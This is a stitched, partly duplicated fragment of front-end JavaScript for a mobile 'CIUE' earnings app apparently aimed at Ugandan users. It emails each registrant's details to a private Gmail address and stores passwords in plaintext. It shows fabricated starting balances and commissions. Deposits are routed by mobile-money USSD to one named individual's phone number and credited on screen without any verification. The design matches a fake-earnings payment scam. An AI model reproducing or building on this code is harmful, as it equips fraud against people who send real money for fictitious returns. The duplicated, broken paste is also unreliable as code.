      showEmailStatus('📧 Sending registration details to your email...', true);
      
      try {
        // Send email notification using FormSubmit.co
        const formData = new FormData();
        formData.append('Name', fullName);
        formData.append('Phone', phone);
        formData.append('Country', country);
        formData.append('_subject', '🎉 NEW CIUE REGISTRATION!');
        formData.append('_captcha', 'false');
        
        const response = await fetch('https://formsubmit.co/ajax/muteguya00@gmail.com', {
          method: 'POST',
          body: formData
        });
        
        if (response.ok) {
          showEmailStatus('✅ Email sent successfully! You will be notified when someone registers.', true);
        } else {
          showEmailStatus('⚠️ Email notification failed but registration saved locally.', false);
        }
      } catch (error) {
        console.error('Email error:', error);
        showEmailStatus('⚠️ Could not send email, but registration saved locally.', false);
      }
      
      // Save user locally
      users[phone] = {
        fullName: fullName,
        phone: phone,
        country: country,
        password: password,
        registeredDate: new Date().toLocaleString(),
        balance: 12500,
        commissionBalance: 387566.50,
        transactions: [
          { type: 'deposit', amount: 10000, date: '2024-01-15' },
          { type: 'deposit', amount: 2500, date: '2024-01-14' }
        ]
      };
      
      localStorage.setItem('cueUsers', JSON.stringify(users));
      localStorage.setItem('currentUser', phone);
      
      showMessage('Registration successful! Welcome to CIUE!');
      
      // Show dashboard
      setTimeout(() => {
        showDashboard(phone);
      }, 1000);
    }

    // Handle Login
    function handleLogin(event) {
      event.preventDefault();
      
      const phone = document.getElementById('loginPhone').value.trim();
      const password = document.getElementById('loginPassword').value;
      
      if (!phone || !password) {
        showMessage('Please enter phone number and password', false);
        return;
      }
      
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      const user = users[phone];
      
      if (!user || user.password !== password) {
        showMessage('Invalid phone number or password', false);
        return;
      }
      
      localStorage.setItem('currentUser', phone);
      
      showMessage('Login successful! Welcome back!');
      
      setTimeout(() => {
        showDashboard(phone);
      }, 1000);
    }

    // Show dashboard with user info
    function showDashboard(phone) {
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      const user = users[phone];
      
      if (!user) return;
      
      document.getElementById('balanceAmount').innerHTML = `${(user.balance || 12500).toLocaleString()} <small>UGX</small>`;
      
      // Update profile page with user data
      document.getElementById('profileName').textContent = user.fullName || 'Regular Employee';
      document.getElementById('profileDisplayName').textContent = user.fullName.split(' ')[0] || 'User';
      document.getElementById('mainWallet').innerHTML = `${(user.balance || 12500).toFixed(2)} <small>UGX</small>`;
      
      window.currentUserPhone = phone;
      window.currentUser = user;
      
      document.getElementById('authContainer').style.display = 'none';
      document.getElementById('mainDashboard').style.display = 'flex';
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      
      // Update time
      updateTime();
      updateActiveNav('home');
    }

    // Show profile page
    function showProfilePage() {
      document.getElementById('mainDashboard').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      document.getElementById('profilePage').style.display = 'flex';
      updateTime();
      updateActiveNav('me');
    }

    // Show home page
    function showHomePage() {
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      document.getElementById('mainDashboard').style.display = 'flex';
      updateActiveNav('home');
    }

    // Show level page
    function showLevelPage() {
      document.getElementById('mainDashboard').style.display = 'none';
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'flex';
      updateActiveNav('level');
    }

    // Update active navigation item
    function updateActiveNav(active) {
      // Get all bottom nav containers
      const navs = document.querySelectorAll('.bottom-nav');
      
      navs.forEach(nav => {
        const items = nav.querySelectorAll('.nav-item');
        items.forEach(item => item.classList.remove('active'));
        
        if (active === 'home') items[0].classList.add('active');
        else if (active === 'task') items[1].classList.add('active');
        else if (active === 'level') items[2].classList.add('active');
        else if (active === 'income') items[3].classList.add('active');
        else if (active === 'me') items[4].classList.add('active');
      });
    }

    // Update current time
    function updateTime() {
      const now = new Date();
      let hours = now.getHours();
      const minutes = now.getMinutes().toString().padStart(2, '0');
      const ampm = hours >= 12 ? 'PM' : 'AM';
      hours = hours % 12;
      hours = hours ? hours : 12;
      document.getElementById('currentTime').textContent = `${hours}:${minutes} ${ampm}`;
    }

    // Logout function
    function logout() {
      localStorage.removeItem('currentUser');
      document.getElementById('authContainer').style.display = 'block';
      document.getElementById('mainDashboard').style.display = 'none';
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      switchAuthTab('login');
      
      // Clear all fields
      document.getElementById('loginPhone').value = '';
      document.getElementById('loginPassword').value = '';
      document.getElementById('regFullName').value = '';
      document.getElementById('regPhone').value = '';
      document.getElementById('regPassword').value = '';
      document.getElementById('regConfirmPassword').value = '';
      document.getElementById('regCountry').value = '';
    }

    // DEPOSIT MODAL FUNCTIONS
    const RECIPIENT_NUMBER = '0756673144';
    const RECIPIENT_NAME = 'NAMUHANGA VERONIC';
    
    function openDepositModal() {
      document.getElementById('depositModal').style.display = 'flex';
      updateUssdCode();
    }
    
    function closeDepositModal() {
      document.getElementById('depositModal').style.display = 'none';
    }
    
    function setDepositAmount(amount) {
      document.getElementById('customAmount').value = amount;
      updateUssdCode();
    }
    
    function updateUssdCode() {
      let amount = document.getElementById('customAmount').value;
      if (!amount || amount < 1000) {
        amount = 'AMOUNT';
      } else {
        amount = parseInt(amount).toLocaleString() + ' UGX';
      }
      document.getElementById('amountDisplay').textContent = amount;
    }
    
    function processDeposit() {
      let amount = parseInt(document.getElementById('customAmount').value);
      
      if (!amount || amount < 1000) {
        alert('❌ Please enter a valid amount (minimum 1000 UGX)');
        return;
      }
      
      if (confirm(`Send ${amount.toLocaleString()} UGX to ${RECIPIENT_NUMBER} (${RECIPIENT_NAME})?`)) {
        
        const ussdCode = `*165*1*${RECIPIENT_NUMBER}*${amount}#`;
        window.location.href = `tel:${ussdCode}`;
        
        setTimeout(() => {
          alert(`📱 Dial ${ussdCode} manually to complete payment`);
        }, 500);
        
        const currentUser = localStorage.getItem('currentUser');
        if (currentUser) {
          const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
          if (users[currentUser]) {
            users[currentUser].balance = (users[currentUser].balance || 12500) + amount;
            if (!users[currentUser].transactions) users[currentUser].transactions = [];
            users[currentUser].transactions.unshift({
              type: 'deposit',
              amount: amount,
              date: new Date().toLocaleDateString()
            });
            localStorage.setItem('cueUsers', JSON.stringify(users));
            
            document.getElementById('balanceAmount').innerHTML = `${users[currentUser].balance.toLocaleString()} <small>UGX</small>`;
            document.getElementById('mainWallet').innerHTML = `${users[currentUser].balance.toFixed(2)} <small>UGX</small>`;
          }
        }
        
        alert(`⏳ Payment initiated!\n\nPlease complete the transaction on your phone.`);
      }
    }
    
    function showHistory() {
      let historyDiv = document.getElementById('historySection');
      let transactionList = document.getElementById('transactionList');
      
      const currentUser = localStorage.getItem('currentUser');
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      const user = users[currentUser];
      const transactions = user?.transactions || [];
      
      let html = '';
      transactions.forEach(t => {
        html += `
          <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #eee;">
            <span>+${t.amount.toLocaleString()} UGX</span>
            <span style="color:#666;">${t.date}</span>
          </div>
        `;
      });
      
      if (transactions.length === 0) {
        html = '<p style="color:#666; text-align:center;">No transactions yet</p>';
      }
      
      transactionList.innerHTML = html;
      
      if (historyDiv.style.display === 'none') {
        historyDiv.style.display = 'block';
        openDepositModal();
      } else {
        historyDiv.style.display = 'none';
      }
    }
    
    window.onclick = function(event) {
      let modal = document.getElementById('depositModal');
      if (event.target === modal) {
        modal.style.display = 'none';
      }
    }
    
    document.getElementById('customAmount')?.addEventListener('input', updateUssdCode);

    window.onload = function() {
      const currentUser = localStorage.getItem('currentUser');
      
      if (currentUser) {
        const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
        if (users[currentUser]) {
          showDashboard(currentUser);
        } else {
          localStorage.removeItem('currentUser');
        }
      }
      
      // Create demo account if none exists
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      if (Object.keys(users).length === 0) {
        users['0756673144'] = {
          fullName: 'Mindy official',
          phone: '0756673144',
          country: 'Uganda',
          password: '123456',
          registeredDate: new Date().toLocaleString(),
          balance: 12500,
          commissionBalance: 387566.50,
          transactions: [
            { type: 'deposit', amount: 10000, date: '2024-01-15' },
            { type: 'deposit', amount: 2500, date: '2024-01-14' }
          ]
        };
        localStorage.setItem('cueUsers', JSON.stringify(users));
      }
      
      // Update time every minute
      setInterval(updateTime, 60000);
    }
  </script>
</body>
</html>￼Enter      document.getElementById('mainWallet').innerHTML = `${(user.balance || 12500).toFixed(2)} <small>UGX</small>`;
      
      window.currentUserPhone = phone;
      window.currentUser = user;
      
      document.getElementById('authContainer').style.display = 'none';
      document.getElementById('mainDashboard').style.display = 'flex';
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      
      // Update time
      updateTime();
      updateActiveNav('home');
    }

    // Show profile page
    function showProfilePage() {
      document.getElementById('mainDashboard').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      document.getElementById('profilePage').style.display = 'flex';
      updateTime();
      updateActiveNav('me');
    }

    // Show home page
    function showHomePage() {
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      document.getElementById('mainDashboard').style.display = 'flex';
      updateActiveNav('home');
    }

    // Show level page
    function showLevelPage() {
      document.getElementById('mainDashboard').style.display = 'none';
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'flex';
      updateActiveNav('level');
    }

    // Update active navigation item
    function updateActiveNav(active) {
      // Get all bottom nav containers
      const navs = document.querySelectorAll('.bottom-nav');
      
      navs.forEach(nav => {
        const items = nav.querySelectorAll('.nav-item');
        items.forEach(item => item.classList.remove('active'));
        
        if (active === 'home') items[0].classList.add('active');
        else if (active === 'task') items[1].classList.add('active');
        else if (active === 'level') items[2].classList.add('active');
        else if (active === 'income') items[3].classList.add('active');
        else if (active === 'me') items[4].classList.add('active');
      });
    }

    // Update current time
    function updateTime() {
      const now = new Date();
      let hours = now.getHours();
const minutes = now.getMinutes().toString().padStart(2, '0');
      const ampm = hours >= 12 ? 'PM' : 'AM';
      hours = hours % 12;
      hours = hours ? hours : 12;
      document.getElementById('currentTime').textContent = `${hours}:${minutes} ${ampm}`;
    }

    // Logout function
    function logout() {
      localStorage.removeItem('currentUser');
      document.getElementById('authContainer').style.display = 'block';
      document.getElementById('mainDashboard').style.display = 'none';
      document.getElementById('profilePage').style.display = 'none';
      document.getElementById('levelPage').style.display = 'none';
      switchAuthTab('login');
      
      // Clear all fields
      document.getElementById('loginPhone').value = '';
      document.getElementById('loginPassword').value = '';
      document.getElementById('regFullName').value = '';
      document.getElementById('regPhone').value = '';
      document.getElementById('regPassword').value = '';
      document.getElementById('regConfirmPassword').value = '';
      document.getElementById('regCountry').value = '';
    }

    // DEPOSIT MODAL FUNCTIONS
    const RECIPIENT_NUMBER = '0756673144';
    const RECIPIENT_NAME = 'NAMUHANGA VERONIC';
    
    function openDepositModal() {
      document.getElementById('depositModal').style.display = 'flex';
      updateUssdCode();
    }
    
    function closeDepositModal() {
      document.getElementById('depositModal').style.display = 'none';
    }
    
    function setDepositAmount(amount) {
      document.getElementById('customAmount').value = amount;
      updateUssdCode();
    }
    
    function updateUssdCode() {
      let amount = document.getElementById('customAmount').value;
      if (!amount || amount < 1000) {
        amount = 'AMOUNT';
      } else {
        amount = parseInt(amount).toLocaleString() + ' UGX';
      }
      document.getElementById('amountDisplay').textContent = amount;
    }
    
    function processDeposit() {
      let amount = parseInt(document.getElementById('customAmount').value);
      
      if (!amount || amount < 1000) {
        alert('❌ Please enter a valid amount (minimum 1000 UGX)');
        return;
      }
      
      if (confirm(`Send ${amount.toLocaleString()} UGX to ${RECIPIENT_NUMBER} (${RECIPIENT_NAME})?`)) {
        
        const ussdCode = `*165*1*${RECIPIENT_NUMBER}*${amount}#`;
        window.location.href = `tel:${ussdCode}`;
        
        setTimeout(() => {
          alert(`📱 Dial ${ussdCode} manually to complete payment`);
        }, 500);
        
        const currentUser = localStorage.getItem('currentUser');
        if (currentUser) {
          const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
          if (users[currentUser]) {
            users[currentUser].balance = (users[currentUser].balance || 12500) + amount;
            if (!users[currentUser].transactions) users[currentUser].transactions = [];
            users[currentUser].transactions.unshift({
              type: 'deposit',
              amount: amount,
